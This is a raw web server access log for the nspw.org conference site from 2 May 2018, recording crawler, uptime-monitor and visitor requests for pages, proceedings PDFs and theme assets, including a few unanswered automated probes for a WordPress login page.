111.204.219.197 - - [02/May/2018:21:59:11 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3319 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
111.204.219.197 - - [02/May/2018:21:59:11 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
111.204.219.197 - - [02/May/2018:21:59:12 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
207.46.13.1 - - [02/May/2018:21:59:51 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 503040 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [02/May/2018:22:00:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
183.88.35.50 - - [02/May/2018:22:01:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
183.88.35.50 - - [02/May/2018:22:01:02 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.1 - - [02/May/2018:22:01:38 -0400] "GET /papers/1996/nspw1996-nelson.pdf HTTP/1.1" 200 384911 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [02/May/2018:22:03:40 -0400] "GET /2003/nspw-header.shtml HTTP/1.1" 200 4041 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [02/May/2018:22:04:29 -0400] "GET /2013/organizers HTTP/1.1" 200 6790 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:22:05:21 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:22:05:27 -0400] "GET /2005/proceedings.shtml HTTP/1.1" 200 4810 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
122.54.133.221 - - [02/May/2018:22:06:03 -0400] "GET /wp-login.php HTTP/1.1" 404 8080 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
122.54.133.221 - - [02/May/2018:22:06:04 -0400] "GET / HTTP/1.1" 200 8250 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.219 - - [02/May/2018:22:06:41 -0400] "GET /2018 HTTP/1.1" 200 6903 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
137.112.228.195 - - [02/May/2018:22:08:05 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [02/May/2018:22:08:06 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
216.244.66.200 - - [02/May/2018:22:10:12 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [02/May/2018:22:10:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
162.210.196.130 - - [02/May/2018:22:10:56 -0400] "GET /robots.txt HTTP/1.1" 200 5926 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
162.210.196.130 - - [02/May/2018:22:11:27 -0400] "GET / HTTP/1.1" 200 11520 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
218.76.65.99 - - [02/May/2018:22:09:09 -0400] "GET /2009/proceedings/1997/nspw1997-somayaji-scanned.pdf HTTP/1.1" 200 1195269 "http://xueshu.baidu.com/s?wd=journaluri%3A%287884d6213431754%29%20%E3%80%8ANature%E3%80%8B&pn=10&tn=SE_baiduxueshu_c1gjeupa&ie=utf-8&sort=sc_cited&sc_f_para=sc_hilight%3Dpublish&sc_hit=1&rsv_page=1" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
207.46.13.1 - - [02/May/2018:22:13:58 -0400] "GET /papers/1997/nspw1997-mambo.pdf HTTP/1.1" 200 1057374 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
35.226.164.28 - - [02/May/2018:22:15:00 -0400] "GET /robots.txt HTTP/1.1" 200 4496 "-" "ltx71 - (http://ltx71.com/)"
69.162.124.227 - - [02/May/2018:22:15:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
162.211.32.145 - - [02/May/2018:22:16:32 -0400] "GET / HTTP/1.1" 200 6589 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:32 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 4418 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:32 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2283 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 738 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1577 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 740 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 646 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 613 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5495 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 763 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1437 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27553 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7348 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2518 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 985 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 790 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3216 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3146 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 480 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 478 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 487 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 804 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 746 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:16:33 -0400] "GET /favicon.ico HTTP/1.1" 404 692 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:17:22 -0400] "GET /2018/cfp HTTP/1.1" 200 4882 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:18:15 -0400] "GET /2018/dates HTTP/1.1" 200 3000 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36"
162.211.32.145 - - [02/May/2018:22:18:48 -0400] "-" 408 148 "-" "-"
162.211.32.145 - - [02/May/2018:22:18:48 -0400] "-" 408 148 "-" "-"
162.211.32.145 - - [02/May/2018:22:18:48 -0400] "-" 408 148 "-" "-"
162.211.32.145 - - [02/May/2018:22:18:48 -0400] "-" 408 148 "-" "-"
162.211.32.145 - - [02/May/2018:22:18:48 -0400] "-" 408 148 "-" "-"
162.211.32.145 - - [02/May/2018:22:18:48 -0400] "-" 408 148 "-" "-"
66.249.64.219 - - [02/May/2018:22:19:05 -0400] "GET / HTTP/1.1" 200 6605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [02/May/2018:22:20:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [02/May/2018:22:20:58 -0400] "GET /node/81 HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
2.154.119.207 - - [02/May/2018:22:21:48 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
2.154.119.207 - - [02/May/2018:22:21:49 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [02/May/2018:22:22:07 -0400] "GET /2009/proceedings/2006/nspw2006-conti.pdf HTTP/1.1" 200 142735 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [02/May/2018:22:25:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
162.210.196.97 - - [02/May/2018:22:26:21 -0400] "GET /robots.txt HTTP/1.1" 200 5926 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
162.210.196.97 - - [02/May/2018:22:26:48 -0400] "GET / HTTP/1.1" 200 11520 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
194.187.170.110 - - [02/May/2018:22:27:48 -0400] "GET /robots.txt HTTP/1.1" 200 4822 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:22:27:49 -0400] "GET /robots.txt HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:22:27:50 -0400] "GET /2006/submission.content HTTP/1.1" 200 1866 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:22:28:02 -0400] "GET /2006/papers.content HTTP/1.1" 200 458 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:22:28:12 -0400] "GET /2013/program HTTP/1.1" 200 4164 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
162.247.87.111 - - [02/May/2018:22:29:37 -0400] "GET /current/ HTTP/1.1" 200 6922 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:37 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1602 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1182 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2464 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7529 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 903 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 599 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/current/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/themes/garland/style.css?p7r9uw" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
162.247.87.111 - - [02/May/2018:22:29:38 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
194.187.170.110 - - [02/May/2018:22:29:55 -0400] "GET /2006/oc.shtml HTTP/1.1" 200 2074 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:22:30:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [02/May/2018:22:30:41 -0400] "GET /2003/past.content HTTP/1.1" 200 1962 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [02/May/2018:22:31:15 -0400] "GET /2006/index.content HTTP/1.1" 200 1674 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
199.30.25.15 - - [02/May/2018:22:31:46 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 3712 "https://www.nspw.org/2018" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.25.15 - - [02/May/2018:22:31:46 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 3745 "https://www.nspw.org/2018" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.25.15 - - [02/May/2018:22:31:46 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 4011 "https://www.nspw.org/2018" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
199.30.25.15 - - [02/May/2018:22:31:46 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 8610 "https://www.nspw.org/2018" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
